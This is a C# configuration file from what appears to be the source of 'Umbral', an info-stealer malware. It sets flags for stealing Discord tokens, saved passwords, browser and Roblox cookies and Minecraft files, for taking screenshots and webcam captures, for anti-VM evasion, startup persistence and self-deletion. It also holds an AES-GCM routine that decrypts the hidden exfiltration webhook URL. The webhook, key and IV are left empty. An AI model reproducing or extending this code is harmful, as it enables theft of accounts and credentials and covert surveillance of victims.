using System;
using System.Linq;
using System.Text;
using Umbral.payload.Handlers;

namespace Umbral.payload.Config
{
    internal static class Settings
    {
        internal static readonly string WebhookUrl;

        internal static readonly bool Ping;

        internal static readonly string Version;

        internal static readonly bool AntiVm;

        internal static readonly bool Startup;

        internal static readonly bool StealDiscordtokens;

        internal static readonly bool StealPasswords;

        internal static readonly bool StealCookies;

        internal static readonly bool StealRobloxCookies;

        internal static readonly bool StealMinecraftFiles;

        internal static readonly bool TakeScreenshot;

        internal static readonly bool DeleteSelf;

        internal static readonly bool CaptureWebcam;

        internal static readonly string Mutex;

        static Settings()
        {
            //--------------------------------------
            //----------------CONFIG----------------
            //--------------------------------------

            var webhookUrl = "";
            var ping = true; 
            var version = "0.1";
            var antiVm = false;
            var startup = false;
            var stealPasswords = true;
            var stealCookies = true;
            var stealRobloxCookies = true;
            var stealMinecraftFiles = true;
            var stealDiscordTokens = true;
            var takeScreenshot = true;
            var deleteSelf = false;
            var captureWebcam = true;

            //--------------------------------------

            var mutex = "ThisIsAUniQueMuTex";
            var key = "";
            var iv = "";

            WebhookUrl = Decrypt(webhookUrl, key, iv);
            Ping = ping;
            Version = Decrypt(version, key, iv);
            AntiVm = antiVm;
            Startup = startup;
            StealDiscordtokens = stealDiscordTokens;
            StealPasswords = stealPasswords;
            StealCookies = stealCookies;
            StealRobloxCookies = stealRobloxCookies;
            StealMinecraftFiles = stealMinecraftFiles;
            TakeScreenshot = takeScreenshot;
            DeleteSelf = deleteSelf;
            CaptureWebcam = captureWebcam;
            Mutex = mutex;
        }

        private static string Decrypt(string encrypted, string _key, string _iv)
        {
            byte[] buffer = Convert.FromBase64String(encrypted);
            byte[] key = Convert.FromBase64String(_key);
            byte[] iv = Convert.FromBase64String(_iv);

            byte[] cipherText = buffer.Take(buffer.Length - 16).ToArray();
            byte[] tag = buffer.Skip(buffer.Length - 16).ToArray();

            return Encoding.UTF8.GetString(new AesGcm().Decrypt(key, iv, null, cipherText, tag));
        }
    }
}